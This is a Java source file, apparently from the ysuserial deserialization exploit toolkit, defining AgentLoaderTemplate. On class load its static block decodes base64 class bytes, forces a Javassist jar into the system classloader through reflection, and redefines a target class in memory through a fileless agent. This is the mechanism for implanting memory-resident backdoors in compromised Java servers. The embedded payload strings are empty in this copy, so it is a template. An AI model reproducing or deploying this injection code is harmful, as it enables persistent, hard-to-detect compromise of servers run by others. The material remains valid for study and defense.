package org.su18.ysuserial.payloads.templates.agent;

import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.List;

/**
 * @author su18
 */
public class AgentLoaderTemplate extends ClassLoader {

	public static String SU_URL_CONNECTION_BYTES;

	public static String SU_URL_STREAM_HANDLER_BYTES;

	public static String CLASS_MODIFIER_BYTES;

	public static String AGENT_NO_FILE_BYTES;

	public static String JAR_BODY;

	public AgentLoaderTemplate() {
	}

	public AgentLoaderTemplate(ClassLoader c) {
		super(c);
	}

	static {
		try {
			initJavassistJar();
			// 需要让 System ClassLoader 成为自己的父类，这样在后面打入 Javassist Jar 包之后，自己也能找到 javassist 的类
			AgentLoaderTemplate tmpl = new AgentLoaderTemplate(getSystemClassLoader());

			try {
				// 如果当前环境有 Javassist，则使用当前环境的
				Class.forName("javassist.CtClass", false, tmpl);
			} catch (Exception ignored) {
				// 在内存中打一个 Javassist 进去
				Class a = tmpl.defineClass(base64Decode(SU_URL_CONNECTION_BYTES));
				tmpl.defineClass(base64Decode(SU_URL_STREAM_HANDLER_BYTES));
				byte[]         jarBytes    = base64Decode(JAR_BODY);
				URL            url         = (URL) a.getMethod("createURL", byte[].class, String.class).invoke(null, jarBytes, "application/jar");
				URLClassLoader classLoader = (URLClassLoader) ClassLoader.getSystemClassLoader();
				Method         method      = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
				method.setAccessible(true);
				method.invoke(classLoader, url);
			}

			Class classModifier = tmpl.defineClass(base64Decode(CLASS_MODIFIER_BYTES));

			// 反射调用，获取 Hook 类字节码，插入关键逻辑和需要的方法 Field 等
			Method method1 = classModifier.getMethod("insert", new Class[]{});
			method1.setAccessible(true);
			List<Object> list            = (List<Object>) method1.invoke(null);
			String       targetClassName = list.get(0).toString();
			byte[]       newClassByte    = (byte[]) list.get(1);

			// 执行 AgentNoFile 逻辑
			Class  agent = tmpl.defineClass(base64Decode(AGENT_NO_FILE_BYTES));
			Method m     = agent.getDeclaredMethod("redefineClasses", new Class[]{String.class, byte[].class});
			m.invoke(null, targetClassName, newClassByte);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}


	public Class defineClass(byte[] classBytes) {
		return super.defineClass(classBytes, 0, classBytes.length);
	}

	public static byte[] base64Decode(String bs) throws Exception {
		Class  base64;
		byte[] value = null;
		try {
			base64 = Class.forName("java.util.Base64");
			Object decoder = base64.getMethod("getDecoder", new Class[]{}).invoke(null, (Object[]) null);
			value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
		} catch (Exception ignored) {
			try {
				base64 = Class.forName("sun.misc.BASE64Decoder");
				Object decoder = base64.newInstance();
				value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
			} catch (Exception whatever) {
			}
		}
		return value;
	}

	public static void initJavassistJar() {
		JAR_BODY = "";
		JAR_BODY += "";
		JAR_BODY += "";
		JAR_BODY += "";
		JAR_BODY += "";
		JAR_BODY += "";
		JAR_BODY += "";
		JAR_BODY += "";
		JAR_BODY += "";
		JAR_BODY += "";
		JAR_BODY += "";
		JAR_BODY += "";
		JAR_BODY += "";
		JAR_BODY += "";
		JAR_BODY += "";
		JAR_BODY += "";
		JAR_BODY += "";
		JAR_BODY += "";
		JAR_BODY += "";
		JAR_BODY += "";
		JAR_BODY += "";
		JAR_BODY += "";
	}
}
